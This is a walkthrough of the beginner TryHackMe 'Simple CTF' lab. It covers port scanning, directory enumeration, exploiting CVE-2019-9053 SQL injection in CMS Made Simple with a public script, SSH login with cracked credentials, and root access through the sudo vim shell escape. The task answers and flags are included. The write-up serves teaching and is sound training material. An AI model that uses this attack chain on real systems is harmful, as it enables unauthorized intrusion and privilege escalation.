# Simple CTF

## Overview

A beginner-friendly CTF involving port scanning, web enumeration, CVE exploitation, and privilege escalation via a misconfigured sudo binary. The challenge covers a realistic attack chain: reconnaissance → vulnerability identification → exploitation → privilege escalation.

**Room:** https://tryhackme.com/room/easyctf

---

## Topics Covered

- Port scanning with `nmap`
- Directory enumeration with `gobuster`
- CVE identification (CVE-2019-9053)
- SQL injection exploitation via a public exploit script
- SSH access with discovered credentials
- Privilege escalation via `vim` and `sudo`

---

## Key Concepts

### Attack Chain

```
Reconnaissance (nmap)
        |
Web enumeration (gobuster)
        |
CVE identification (CMS Made Simple)
        |
Exploit execution → credentials obtained
        |
SSH login
        |
Privilege escalation (sudo vim → root)
```

---

## Walkthrough

### Task 1-1: How many open ports below 1000?

```bash
nmap -p-1000 -A -v <MACHINE_IP>
```

- `-p-1000` — scan ports 1–1000
- `-A` — OS detection, version detection, script scanning
- `-v` — verbose output

**Result:** 2 open ports — port 21 (FTP) and port 80 (HTTP)

**Answer: 2**

---

### Task 1-2: What is running on the higher port?

```bash
nmap -p- -v <MACHINE_IP>
```

Full port scan reveals port 2222 is open. A targeted scan confirms:

```bash
nmap -p 2222 -A -v <MACHINE_IP>
```

Port 2222 is running SSH — moved from the default port 22.

**Answer: ssh**

---

### Task 1-3: What CVE can be used against the machine?

**FTP (port 21):** Empty — nothing useful.

**HTTP (port 80):** Apache default page initially. Deeper scan reveals `robots.txt` — references a CUPS print server path, nothing exploitable.

**Directory enumeration:**

```bash
gobuster dir -u http://<MACHINE_IP> -w /usr/share/dirb/wordlists/common.txt
```

Discovers `/simple` directory. Navigating to it reveals **CMS Made Simple**.

Searching for CMS Made Simple vulnerabilities returns **CVE-2019-9053** — a time-based blind SQL injection vulnerability in the News module.

**Answer: CVE-2019-9053**

---

### Task 1-4: What kind of vulnerability?

CVE-2019-9053 is a SQL injection vulnerability in CMS Made Simple's News module, exploitable without authentication.

**Answer: sqli**

---

### Task 1-5: Run the exploit

A public Python exploit script is available for CVE-2019-9053. Run it with a wordlist to crack the extracted hash:

```bash
python CVE-2019-9053.py -u http://<MACHINE_IP>/simple/ --crack -w /usr/share/dirb/wordlists/others/best110.txt
```

**Result:** Username `mitch`, password `secret`

**Answer: secret**

---

### Task 1-6: How to use the credentials?

SSH is running on port 2222. Use the discovered credentials:

```bash
ssh -p 2222 mitch@<MACHINE_IP>
```

**Answer: ssh**

---

### Task 1-7: Mitch's flag

Navigate to Mitch's home directory and read the flag:

```bash
ls
cat user.txt
```

**Answer: G00d j0b, keep up!**

---

### Task 1-8: Find another user

The other user was visible in the previous task's output.

**Answer: sunbath**

---

### Task 1-9: What can Mitch run with sudo?

Check Mitch's sudo privileges:

```bash
sudo -l
```

**Result:** Mitch can run `vim` with sudo.

**Answer: vim**

---

### Task 1-10: Root flag

Escalate to root using vim's shell escape:

```bash
sudo vim
```

Inside vim, execute a shell:

```
:!bash
```

Now running as root. Read the root flag:

```bash
cat /root/root.txt
```

**Answer: W3ll d0n3. You made it!**

---

## Practical Examples / Demonstrations

### Full command sequence

```bash
# Reconnaissance
nmap -p-1000 -A -v <MACHINE_IP>
nmap -p- -v <MACHINE_IP>

# Web enumeration
gobuster dir -u http://<MACHINE_IP> -w /usr/share/dirb/wordlists/common.txt

# Exploit CVE-2019-9053
python CVE-2019-9053.py -u http://<MACHINE_IP>/simple/ --crack -w /usr/share/dirb/wordlists/others/best110.txt

# SSH login
ssh -p 2222 mitch@<MACHINE_IP>

# Privilege escalation
sudo -l
sudo vim
# Inside vim:
:!bash

# Root flag
cat /root/root.txt
```

---

## Real-World Relevance

- Running SSH on a non-standard port (2222 instead of 22) is security through obscurity — it reduces noise from automated scanners but doesn't stop a thorough enumeration
- CVE-2019-9053 demonstrates how an unpatched CMS can expose an entire server — keeping web applications updated is a critical defensive control
- `sudo -l` is one of the first commands run during Linux privilege escalation enumeration — misconfigured sudo entries are a common escalation path
- GTFOBins (https://gtfobins.github.io) documents how binaries like `vim`, `python`, `find`, and many others can be abused for privilege escalation when run with sudo
- The attack chain here (recon → web enum → CVE exploit → SSH → sudo escalation) mirrors real-world penetration test methodology

---

## Key Learnings

- Always scan all ports — services on non-standard ports are missed by default scans
- Directory enumeration frequently reveals hidden content not linked from the main page
- Public CVE exploit scripts are readily available — unpatched software is a reliable attack vector
- `sudo -l` reveals privilege escalation opportunities — any binary with sudo rights is a potential escalation path
- vim's `:!bash` shell escape is a classic GTFOBins technique

---

## Additional Notes

- CVE-2019-9053 affects CMS Made Simple versions prior to 2.2.10
- GTFOBins vim entry: https://gtfobins.github.io/gtfobins/vim/
- `robots.txt` is always worth checking — it can reveal hidden paths even when the content itself isn't useful
- The exploit script uses time-based blind SQLi to extract credentials — it's slow but reliable

---

## Conclusion

Simple CTF is a clean beginner challenge that walks through a complete attack chain. The key lessons are practical: thorough port scanning, web enumeration beyond the homepage, CVE research on identified software, and checking sudo privileges immediately after gaining a foothold. These steps appear in almost every Linux-based CTF and real-world penetration test.
